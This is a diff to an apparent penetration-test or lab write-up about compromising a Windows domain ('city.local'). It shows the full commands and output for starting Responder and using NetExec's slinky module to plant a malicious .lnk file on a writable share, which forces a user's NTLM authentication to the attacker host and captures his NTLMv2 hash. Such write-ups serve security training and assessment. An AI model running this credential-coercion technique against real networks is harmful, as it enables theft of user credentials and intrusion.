@@ -506,14 +506,16 @@ IT Helpdesk – City Counci
 
 With write access to a share that Jon Peters actively browses, the NetExec `slinky` module was used to create a malicious `.lnk` file that forces an NTLM authentication back to the attacker's Responder listener.
 
+First, Responder was started to listen for incoming NTLM authentication attempts:
+
 ```bash
 responder -I tun0
 ```
 
+Then, the NetExec `slinky` module deployed a malicious `.lnk` file to the Uploads share:
+
 ```
 Exegol ➜ /workspace/docs x nxc smb 10.0.29.180 -u "clerk.john" -p '[REDACTED]' -M slinky -o NAME=Uploads SERVER=10.200.38.219
-/root/.pyenv/versions/3.11.14/lib/python3.11/site-packages/requests/__init__.py:l13: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (6.0.0.post1)/charset_normalizer (3.4.4) doesn't match a supported version!
-  warnings.warn()
 SMB         10.0.29.180     445    DC-CC    [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local)
 (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         10.0.29.180     445    DC-CC    [+] city.local\clerk.john:[REDACTED]
@@ -529,14 +531,16 @@ SMB         10.0.29.180     445    DC-CC    SYSVOL          READ            Logo
 SMB         10.0.29.180     445    DC-CC    Uploads         READ,WRITE      Logon server share
 SLINKY      10.0.29.180     445    DC-CC    [+] Found writable share: Uploads
 SLINKY      10.0.29.180     445    DC-CC    [+] Created LNK file on the Uploads share
+```
 
+When Jon Peters browsed the share, the `.lnk` file triggered an NTLM authentication back to Responder, capturing the NTLMv2 hash:
+
+```
 [SMB] NTLMv2-SSP Client   : 10.0.29.180
 [SMB] NTLMv2-SSP Username : CITY\jon.peters
 [SMB] NTLMv2-SSP Hash     :
 jon.peters::CITY:[REDACTED]
 ```
-
-Responder captured Jon Peters' NTLMv2 hash when he browsed the share containing the malicious `.lnk` file.
 
 ## 5.5 Cracking NTLMv2
 
